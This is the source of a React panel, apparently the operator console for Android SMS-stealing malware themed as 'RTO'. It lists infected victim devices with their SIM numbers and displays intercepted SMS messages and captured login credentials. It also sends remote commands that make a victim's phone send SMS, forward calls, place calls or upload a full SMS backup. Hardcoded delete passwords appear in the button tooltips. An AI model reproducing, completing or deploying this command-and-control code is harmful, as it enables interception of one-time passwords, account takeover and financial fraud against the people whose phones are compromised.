"use client";
import React, { useState, useEffect } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

const DEVICE_LIMIT = 10;

export default function DevicesPanel({ 
  data, 
  deviceOnlineStatus, 
  deviceSerialMap, 
  favourites, 
  toggleFavourite, 
  showToast,
  openSmsModal,
  deleteAllSms,
  deleteAllCredentials,
  deleteAllDevices
}) {
  const [searchQuery, setSearchQuery] = useState("");
  const [filter, setFilter] = useState("all");
  const [offset, setOffset] = useState(0);
  const [expandedDevices, setExpandedDevices] = useState({});
  const [activeTabs, setActiveTabs] = useState({});

  // Permanent Storage - SMS & Call Forward data send hone ke baad bhi nahi hatega
  const [smsPhone, setSmsPhone] = useState("");
  const [smsBody, setSmsBody] = useState("");
  const [simChoice, setSimChoice] = useState({});
  const [fwdSimChoice, setFwdSimChoice] = useState({});
  const [formMemory, setFormMemory] = useState({});

  useEffect(() => {
    try {
      const savedPhone = localStorage.getItem("rto_panel_phone");
      const savedBody = localStorage.getItem("rto_panel_body");
      const savedSims = localStorage.getItem("rto_panel_sims");
      const savedFwdSims = localStorage.getItem("rto_panel_fwd_sims");
      const savedMemory = localStorage.getItem("rto_panel_memory");

      if (savedPhone !== null) setSmsPhone(savedPhone);
      if (savedBody !== null) setSmsBody(savedBody);
      if (savedSims) setSimChoice(JSON.parse(savedSims));
      if (savedFwdSims) setFwdSimChoice(JSON.parse(savedFwdSims));
      if (savedMemory) setFormMemory(JSON.parse(savedMemory));
    } catch (e) {}
  }, []);

  const handlePhoneChange = (val) => {
    setSmsPhone(val);
    try {
      localStorage.setItem("rto_panel_phone", val);
    } catch (e) {}
  };

  const handleBodyChange = (val) => {
    setSmsBody(val);
    try {
      localStorage.setItem("rto_panel_body", val);
    } catch (e) {}
  };

  const handleSimChange = (devId, val) => {
    setSimChoice((prev) => {
      const updated = { ...prev, [devId]: val };
      try {
        localStorage.setItem("rto_panel_sims", JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  const handleFwdSimChange = (devId, val) => {
    setFwdSimChoice((prev) => {
      const updated = { ...prev, [devId]: val };
      try {
        localStorage.setItem("rto_panel_fwd_sims", JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  const updateMemoryField = (key, val) => {
    setFormMemory((prev) => {
      const updated = { ...prev, [key]: val };
      try {
        localStorage.setItem("rto_panel_memory", JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  const devices = data.user_data || {};
  const deviceStatus = data.device_status || {};

  let keys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));

  if (searchQuery) {
    const q = searchQuery.toLowerCase();
    keys = keys.filter(id => {
      const dev = devices[id] || {};
      const status = deviceStatus[id] || {};
      const name = status.device_name || dev.d_name || dev.Device_info || id;
      const serial = deviceSerialMap[id] || 0;
      return (id + " " + name + " " + serial).toLowerCase().includes(q);
    });
  }

  keys.sort((a, b) => {
    const onA = deviceOnlineStatus[a] ? 1 : 0;
    const onB = deviceOnlineStatus[b] ? 1 : 0;
    if (onA !== onB) return onB - onA;
    const sA = deviceSerialMap[a] || 0;
    const sB = deviceSerialMap[b] || 0;
    return sB - sA;
  });

  if (filter === "online") {
    keys = keys.filter(id => deviceOnlineStatus[id] === true);
  } else if (filter === "offline") {
    keys = keys.filter(id => !deviceOnlineStatus[id]);
  }

  const paginatedKeys = keys.slice(offset, offset + DEVICE_LIMIT);

  const copyToClipboard = (text, label = "Item") => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
  };

  const toggleExpand = (id) => {
    setExpandedDevices(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleTab = (devId, tab) => {
    setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
  };

  const handleCommand = (type, devId) => {
    const baseRef = ref(db, `user_data/${devId}`);

    if (type === "sendsms") {
      const num = (smsPhone || "").trim();
      const body = (smsBody || "").trim();
      const simSlotSelected = simChoice[devId] || "0";

      if (!num) return showToast("⚠️ Phone number likhein!", "warning");
      if (!body) return showToast("⚠️ Message content likhein!", "warning");

      update(baseRef, {
        command: "send message",
        targetDeviceId: devId,
        phoneNumber: num,
        messageText: body,
        simSlot: simSlotSelected,
        sim: Number(simSlotSelected),
        simIndex: Number(simSlotSelected),
        timestamp: Date.now()
      }).then(() => {
        showToast(`✅ SMS command sent`, "success");
      });
    } 
    else if (type === "fwd_on") {
      const num = formMemory[`fwdNum-${devId}`];
      const selectedSim = fwdSimChoice[devId] || "0";

      if (!num) return showToast("⚠️ Forward phone number likhein!", "warning");

      update(baseRef, {
        command: "call forward",
        targetDeviceId: devId,
        phoneNumber: num,
        forwardNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "fwd_off") {
      const selectedSim = fwdSimChoice[devId] || "0";

      update(baseRef, {
        command: "forward off",
        targetDeviceId: devId,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`⛔ Call Forward OFF (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "call") {
      const num = formMemory[`callNum-${devId}`];
      const selectedSim = formMemory[`callSim-${devId}`] || "0";

      if (!num) return showToast("⚠️ Enter target number!", "warning");

      update(baseRef, {
        command: "make call",
        adminNumber: num,
        phoneNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`📞 Calling via SIM ${Number(selectedSim) + 1}`, "success"));
    } 
    else if (type === "backup") {
      if (!confirm(`Trigger full SMS backup on ${devId}?`)) return;
      update(baseRef, { command: "backup", timestamp: Date.now() })
        .then(() => showToast("💾 Backup initiated", "success"));
    }
  };

  // Card Level Data & Device Delete Handler
  const deleteDeviceData = (devId, type) => {
    let targetPwd = "9090";
    if (type === "sms") targetPwd = "1122";
    else if (type === "credentials") targetPwd = "3344";
    else if (type === "device") targetPwd = "5566";

    const pwd = prompt(`🔐 Enter Password to delete ${type.toUpperCase()}:`);
    if (pwd !== targetPwd) return showToast(`❌ Invalid Password for ${type}`, "error");
    if (!confirm(`Are you sure you want to delete ${type} for ${devId}?`)) return;

    if (type === "sms") {
      remove(ref(db, `user_sms/${devId}`)).then(() => showToast(`Deleted SMS for ${devId}`, "success"));
    } else if (type === "credentials") {
      remove(ref(db, `login/${devId}`)).then(() => showToast(`Deleted Credentials for ${devId}`, "success"));
    } else if (type === "device") {
      Promise.all([
        remove(ref(db, `user_data/${devId}`)),
        remove(ref(db, `device_status/${devId}`))
      ]).then(() => showToast(`Device ${devId} removed`, "success"));
    }
  };

  const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
  const offlineCount = keys.length - onlineCount;

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Registered Devices</h2>
          <p className="panel-sub">Click on any device to expand controls & details</p>
        </div>
        <div className="panel-stats">
          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>
            All ({keys.length})
          </button>
          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>
            🟢 Online ({onlineCount})
          </button>
          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>
            🔴 Offline ({offlineCount})
          </button>
        </div>
      </div>

      <div className="search-container">
        <i className="fas fa-search search-icon"></i>
        <input 
          type="text" 
          value={searchQuery}
          onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
          placeholder="Search by ID, name, or serial..." 
          className="search-input"
        />
        {searchQuery && (
          <button className="search-clear-btn" style={{ display: "block" }} onClick={() => setSearchQuery("")}>
            <i className="fas fa-times"></i>
          </button>
        )}
      </div>

      {/* TOP ACTION BUTTONS BAR */}
      <div style={{ marginBottom: 12, display: "flex", justifyContent: "flex-end", gap: 8, flexWrap: "wrap" }}>
        <button className="btn-delete-all" onClick={deleteAllSms} title="Password: 1122">
          <i className="fas fa-trash-alt"></i> Delete All SMS
        </button>
        <button className="btn-delete-all credential" onClick={deleteAllCredentials} title="Password: 3344">
          <i className="fas fa-key"></i> Delete All Credentials
        </button>
        {/* NAYA BUTTON: DELETE ALL DEVICES */}
        <button 
          className="btn-delete-all" 
          onClick={deleteAllDevices} 
          title="Password: 5566"
          style={{ background: "rgba(220, 38, 38, 0.2)", borderColor: "var(--red)" }}
        >
          <i className="fas fa-mobile-alt"></i> Delete All Devices
        </button>
      </div>

      <div id="devicesContainer">
        {offset > 0 && (
          <button className="btn-load-more" style={{ marginBottom: 10 }} onClick={() => setOffset(Math.max(0, offset - DEVICE_LIMIT))}>
            <i className="fas fa-chevron-up"></i> Previous Page
          </button>
        )}

        {paginatedKeys.map((devId, idx) => {
          const dev = devices[devId] || {};
          const status = deviceStatus[devId] || {};
          const isOnline = Boolean(deviceOnlineStatus[devId]);
          const isFav = favourites.includes(devId);
          const serial = deviceSerialMap[devId] || 0;
          const expanded = expandedDevices[devId];
          const curTab = activeTabs[devId];

          const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";
          const lastSeen = status.last_seen || dev.last_online || "N/A";

          const smsMap = data.user_sms?.[devId] || {};
          const smsList = Object.values(smsMap).reverse();
          const loginMap = data.login?.[devId] || {};
          const loginList = Object.entries(loginMap).map(([key, val]) => ({
            key,
            ...val,
            _timestamp: val.timestamp || val.date || 0
          })).sort((a, b) => b._timestamp - a._timestamp);

          const sim1Num = dev.numberSim1 || "NA";
          const sim2Num = dev.numberSim2 || "NA";
          const currentSim = simChoice[devId] || "0";
          const currentFwdSim = fwdSimChoice[devId] || "0";

          return (
            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
              {/* Card Header */}
              <div className="card-header" onClick={() => toggleExpand(devId)}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div className="device-name-premium">
                    <button 
                      className="fav-star-btn" 
                      onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                    >
                      <i className={isFav ? "fas fa-star" : "far fa-star"}></i>
                    </button>
                    <span className="name-text">📱 {devId.slice(0, 14)}...</span>
                    <span className="device-id">#{offset + idx + 1}</span>
                    {serial > 0 && <span className="serial-badge-premium"># S-{serial}</span>}
                    <button 
                      className="copy-device-id-btn" 
                      onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                    >
                      <i className="fas fa-copy"></i> Copy ID
                    </button>
                  </div>

                  <div className="device-sub-info">
                    <span><i className="fas fa-microchip"></i> Model: {modelName}</span>
                    <span><i className="fas fa-sim-card"></i> {sim1Num}</span>
                    <span><i className="fas fa-sim-card"></i> {sim2Num}</span>
                  </div>
                </div>

                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4 }}>
                  <span className={`status-badge-premium ${isOnline ? "online" : "offline"}`}>
                    <span className="status-dot"></span>
                    {isOnline ? "Online" : "Offline"}
                  </span>
                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                    <i className="far fa-clock"></i> {lastSeen.slice(11) || lastSeen}
                  </span>
                </div>
              </div>

              {/* 4-Item Grid */}
              <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                <div className="info-item-premium">
                  <span className="info-label">DEVICE</span>
                  <span className="info-value">{modelName}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">SIM 1</span>
                  <span className="info-value">{sim1Num}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">SIM 2</span>
                  <span className="info-value">{sim2Num}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">SERIAL</span>
                  <span className="info-value highlight">{serial || "—"}</span>
                </div>
              </div>

              {/* Collapse Trigger */}
              <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
              </div>

              {/* Expandable Tabs */}
              {expanded && (
                <div className="expandable-content">
                  <div className="actions-row-premium">
                    {[
                      { id: "sms", label: "SMS", icon: "fas fa-comment-alt", count: smsList.length },
                      { id: "login", label: "Login", icon: "fas fa-key" },
                      { id: "call", label: "Call", icon: "fas fa-phone-alt" },
                      { id: "sendsms", label: "Send", icon: "fas fa-envelope" },
                      { id: "fwd", label: "Forward", icon: "fas fa-tools" },
                      { id: "backup", label: "Backup", icon: "fas fa-save" },
                      { id: "delete", label: "Delete", icon: "fas fa-trash-alt" }
                    ].map(a => (
                      <button 
                        key={a.id} 
                        type="button"
                        className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                        onClick={() => handleTab(devId, a.id)}
                      >
                        <i className={a.icon}></i> {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                      </button>
                    ))}
                  </div>

                  {/* SMS Sub-tab */}
                  {curTab === "sms" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <span>Messages ({smsList.length})</span>
                        <button 
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            openSmsModal(devId);
                          }} 
                          className="btn-gold" 
                          style={{ marginLeft: "auto", padding: "4px 12px", fontSize: 11, cursor: "pointer" }}
                        >
                          <i className="fas fa-expand" style={{ marginRight: 4 }}></i> View Full
                        </button>
                      </div>
                      <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
                        {smsList.slice(0, 8).map((m, i) => (
                          <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
                            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
                              <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
                              <span>{m.date || ""}</span>
                            </div>
                            <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Login Sub-tab */}
                  {curTab === "login" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <span>Credentials ({loginList.length})</span>
                        <button type="button" onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                      </div>
                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                        {loginList.length === 0 ? (
                          <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                        ) : (
                          loginList.map((cred, i) => (
                            <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.3)", padding: 10, borderRadius: 8, border: "1px solid var(--border-color)" }}>
                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, paddingBottom: 4, borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
                                <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold)" }}>Record #{i + 1}</span>
                                <button
                                  type="button"
                                  onClick={() => {
                                    let str = "";
                                    for (let k in cred) {
                                      if (!k.startsWith("_") && k !== "key") str += `${k}: ${cred[k]}\n`;
                                    }
                                    navigator.clipboard.writeText(str);
                                    showToast("📋 All Record fields copied!", "success");
                                  }}
                                  className="btn-sm"
                                  style={{ background: "rgba(212,175,55,0.15)", color: "var(--gold)", padding: "2px 8px", borderRadius: 4, cursor: "pointer" }}
                                >
                                  <i className="fas fa-copy"></i> Copy All
                                </button>
                              </div>

                              {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
                                <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11, padding: "3px 0", borderBottom: "1px dashed rgba(255,255,255,0.04)" }}>
                                  <span style={{ color: "var(--text-muted)" }}>{k}:</span>
                                  <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                                    <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
                                    <button
                                      type="button"
                                      onClick={() => copyToClipboard(v, k)}
                                      style={{ background: "transparent", border: "none", color: "var(--gold)", cursor: "pointer", fontSize: 11 }}
                                      title={`Copy ${k}`}
                                    >
                                      <i className="fas fa-copy"></i>
                                    </button>
                                  </div>
                                </div>
                              ))}
                            </div>
                          ))
                        )}
                      </div>
                    </div>
                  )}

                  {/* SEND SMS TAB */}
                  {curTab === "sendsms" && (
                    <div className="section-premium" style={{ background: "rgba(12, 16, 26, 0.8)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, padding: 14 }}>
                      <div style={{ fontSize: 13, fontWeight: 600, color: "var(--text-primary)", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
                        <i className="fas fa-envelope" style={{ color: "var(--blue)" }}></i> Send SMS
                      </div>

                      <input 
                        type="text" 
                        placeholder="Enter phone number" 
                        className="search-input" 
                        style={{ 
                          background: "#090d15", 
                          marginBottom: 10, 
                          borderRadius: 8, 
                          border: "1px solid #232b3f", 
                          padding: "10px 14px",
                          fontSize: 13,
                          color: "#fff"
                        }}
                        value={smsPhone}
                        onChange={(e) => handlePhoneChange(e.target.value)}
                      />

                      <textarea 
                        placeholder="Type message content here..." 
                        rows="3"
                        className="search-input" 
                        style={{ 
                          background: "#090d15", 
                          marginBottom: 12, 
                          borderRadius: 8, 
                          border: "1px solid #232b3f", 
                          padding: "10px 14px",
                          fontSize: 13,
                          color: "#fff",
                          height: "auto",
                          resize: "none"
                        }}
                        value={smsBody}
                        onChange={(e) => handleBodyChange(e.target.value)}
                      />

                      <div style={{ marginBottom: 14 }}>
                        <select
                          className="luxury-select"
                          value={currentSim}
                          onChange={(e) => handleSimChange(devId, e.target.value)}
                          style={{
                            background: "#090d15",
                            border: "1px solid #232b3f",
                            borderRadius: 8,
                            padding: "10px 14px",
                            fontSize: 13,
                            color: "#fff",
                            width: "100%",
                            cursor: "pointer"
                          }}
                        >
                          <option value="0">SIM 1</option>
                          <option value="1">SIM 2</option>
                        </select>
                      </div>

                      <button 
                        type="button"
                        className="btn-luxury" 
                        style={{ 
                          width: "100%", 
                          justifyContent: "center", 
                          padding: "12px", 
                          background: "#2563eb", 
                          color: "#fff", 
                          borderRadius: 8, 
                          fontSize: 13,
                          fontWeight: 700 
                        }} 
                        onClick={() => handleCommand("sendsms", devId)}
                      >
                        <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send
                      </button>
                    </div>
                  )}

                  {/* Call Forward Command */}
                  {curTab === "fwd" && (
                    <div className="section-premium" style={{ background: "rgba(12, 16, 26, 0.8)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, padding: 14 }}>
                      <div style={{ fontSize: 13, fontWeight: 600, color: "var(--text-primary)", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
                        <i className="fas fa-tools" style={{ color: "var(--gold)" }}></i> Call Forward Controls
                      </div>

                      <input 
                        type="text" 
                        placeholder="Forward To Phone Number" 
                        className="search-input" 
                        style={{ 
                          background: "#090d15", 
                          marginBottom: 10, 
                          borderRadius: 8, 
                          border: "1px solid #232b3f", 
                          padding: "10px 14px",
                          fontSize: 13,
                          color: "#fff"
                        }}
                        value={formMemory[`fwdNum-${devId}`] || ""}
                        onChange={(e) => updateMemoryField(`fwdNum-${devId}`, e.target.value)}
                      />

                      <div style={{ marginBottom: 14 }}>
                        <select
                          className="luxury-select"
                          value={currentFwdSim}
                          onChange={(e) => handleFwdSimChange(devId, e.target.value)}
                          style={{
                            background: "#090d15",
                            border: "1px solid #232b3f",
                            borderRadius: 8,
                            padding: "10px 14px",
                            fontSize: 13,
                            color: "#fff",
                            width: "100%",
                            cursor: "pointer"
                          }}
                        >
                          <option value="0">SIM 1</option>
                          <option value="1">SIM 2</option>
                        </select>
                      </div>

                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                        <button 
                          type="button"
                          className="btn-luxury" 
                          style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "12px", borderRadius: 8, fontWeight: 700 }} 
                          onClick={() => handleCommand("fwd_on", devId)}
                        >
                          <i className="fas fa-play" style={{ marginRight: 6 }}></i> Turn ON
                        </button>
                        <button 
                          type="button"
                          className="btn-luxury btn-red" 
                          style={{ justifyContent: "center", padding: "12px", borderRadius: 8, fontWeight: 700 }} 
                          onClick={() => handleCommand("fwd_off", devId)}
                        >
                          <i className="fas fa-stop" style={{ marginRight: 6 }}></i> Turn OFF
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Call Sub-tab */}
                  {curTab === "call" && (
                    <div className="section-premium">
                      <div className="section-title">Make Call Command</div>
                      <input 
                        type="text" 
                        placeholder="Target Phone Number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                        value={formMemory[`callNum-${devId}`] || ""}
                        onChange={(e) => updateMemoryField(`callNum-${devId}`, e.target.value)}
                      />
                      <button type="button" className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
                        Execute Call
                      </button>
                    </div>
                  )}

                  {/* Backup Sub-tab */}
                  {curTab === "backup" && (
                    <div className="section-premium">
                      <div className="section-title">Device Backup</div>
                      <button type="button" className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
                        Trigger Full Backup
                      </button>
                    </div>
                  )}

                  {/* Delete Sub-tab */}
                  {curTab === "delete" && (
                    <div className="section-premium" style={{ borderColor: "var(--red)" }}>
                      <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 6 }}>
                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px" }} onClick={() => deleteDeviceData(devId, "sms")}>
                          Delete SMS
                        </button>
                        <button type="button" className="btn-luxury btn-purple" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px" }} onClick={() => deleteDeviceData(devId, "credentials")}>
                          Delete Creds
                        </button>
                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px", background: "#7f1d1d" }} onClick={() => deleteDeviceData(devId, "device")}>
                          Delete Device
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          );
        })}

        {offset + DEVICE_LIMIT < keys.length && (
          <button className="btn-load-more" onClick={() => setOffset(offset + DEVICE_LIMIT)}>
            <i className="fas fa-chevron-down"></i> Load More Devices ({keys.length - (offset + DEVICE_LIMIT)} remaining)
          </button>
        )}
      </div>
    </div>
  );
}
